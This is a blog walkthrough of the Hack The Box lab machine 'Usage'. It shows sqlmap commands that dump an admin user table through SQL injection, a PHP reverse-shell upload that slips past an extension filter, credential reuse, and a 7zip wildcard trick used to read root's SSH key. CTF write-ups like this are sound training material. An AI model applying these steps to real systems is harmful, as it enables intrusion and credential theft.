---
layout: post
title: 'Usage Walkthrough: Conquering Hack The Box Machines "Usage htb"'
date: 20-08-2024
categories: [HackTheBox]
tag: machines
image:
  path: '/55img/usage.png'  
---
## Introduction

Usage is an easy Linux machine that features a blog site vulnerable to SQL injection, enabling the retrieval and cracking of the administrator's hashed password. This grants access to the admin panel, where an outdated Laravel module is exploited to upload a PHP web shell, leading to remote code execution. On the machine, plaintext credentials found in a file allow SSH access as another user, who can execute a custom binary with root privileges. The tool makes an insecure call to 7zip, which is exploited to read the root user’s private SSH key, resulting in full system compromise.

## Reconnaissance 

 Network Scanning: as always, we will do nmap scan to know what is opened ports and it’s services in this machine.as always, we will do nmap scan to know what is opened ports and it’s services in this machine.

 ```
  -─(hu1k0㉿kali)-[~/Desktop/HTB]
  └─$ nmap -sV -sC -oN scan.txt 10.10.11.18 
 ==============================================
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 16:02 EEST
 Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 50.00% done; ETC: 16:03 (0:00:06 remaining)
 Nmap scan report for usage.htb (10.10.11.18)
 Host is up (0.15s latency).
 Not shown: 998 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux;   protocol 2.0)
 | ssh-hostkey: 
 |   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
 |_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 |_http-title: Daily Blogs
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

 Service detection performed. Please report any incorrect results at  https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 54.56 seconds

 ```

## Exploration the website


 

    Visiting the IP address in a browser redirects us to a website named “usage.htb”, presenting a form and various navigation options.

 ![](/Images/usage/login.png)  

 ![](/Images/usage/reg.png)

 ![](/Images/usage/adminlogin.png) 

 - i try to make account and login . 

 and then i found new directory.. ('/dashboard')

 ![](/Images/usage/regfg.png)

 ![](/Images/usage/dash.png)

 - __i open the [burpsuite](https://portswigger.net/burp) and browse the site i hobe to find somthing Juicy..__

 - then i back and try to "Reset Password" to my new register account then i try to do a ```sqlinjection``` and boom it's WORK!!.

 ![](/Images/usage/sssforget.png)

## Exploit 

 now i will use [sqlmap.](https://sqlmap.org/) to do sql injection 

 1. take a new request then make to it dorp not farward and save it in "sql.txt"

     ![](/Images/usage/sql.png)

 2. write this command to do sql injection . and get databases..

     > sqlmap -r sql.txt  -p email --level 5 --risk 3 --threads 10 --batch  --dbs

    ![](/Images/usage/1q.png) 

 3. write this command to get tables in usage_blog database.

     > sqlmap -r sql.txt  -p email --level 5 --risk 3 --threads 10 --batch  -D usage_blog --tables

     ![](/Images/usage/tables.png)

 4. write this command to get admin_users table dump..

     > sqlmap -r sql.txt  -p email --level 5 --risk 3 --threads 10 --batch  -D usage_blog -T admin_users --dump 

     ![](/Images/usage/wrt.png)

 5. now we can to decrypt the hash by [johntheripper.](https://www.kali.org/tools/john/) tool .

     ![](/Images/usage/passs.png)   

 - now we can login in ```admin.usage.htb```   

 ![](/Images/usage/lopop.png) 

 - aftrer some search i understand it have "file upload vulnerability"  

 ![](/Images/usage/file.png)

## User Flag
 
 - now we will try upload [php-reverse-shell] (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 

 ![](/Images/usage/ertoo.png)

 - so i will rename the file befouer i uploud it . 

 > cp shell.php shell.php.jpg

 ![](/Images/usage/okk.png)

 - now i can intercept the request with burp after i clicked submit and change it again from ```shell.php.jpg``` to ```shell.php```
 and click right and open the image in new tab ...

 ![](/Images/usage/shell.png)

 ![](/Images/usage/usertext.png)

 - now after some search in the machine i found this file ```.monitrc```
 - i found this password and connect by ssh.

 ![](Images/usage/xander.png)

  

## Privilege Escalation

 - at first i will use ```sudo -l```

 ![](Images/usage/sudo-l.png) 

 > strings /usr/bin/usage_management

 and i found this 

 ![](/Images/usage/ggggg.png)

 after i search about it i found this.

 ![](/Images/usage/aearch.png)

 ![](Images/usage/hacktriks.png)

 so i will try this to get ```.ssh/id_rsa```

 - first i will go to excutable path and make the files on it ..

 ![](Images/usage/pre1.png)

 ![](Images/usage/collect.png)

 - Make a file called it id_rsa 

 ![](Images/usage/idrttttt.png)

  > chmod 600 id_rsa

  > ssh -i id_rsa root@10.10.11.18

  ![](/Images/usage/root.png)
 
---

![](/Images/usage/d.png)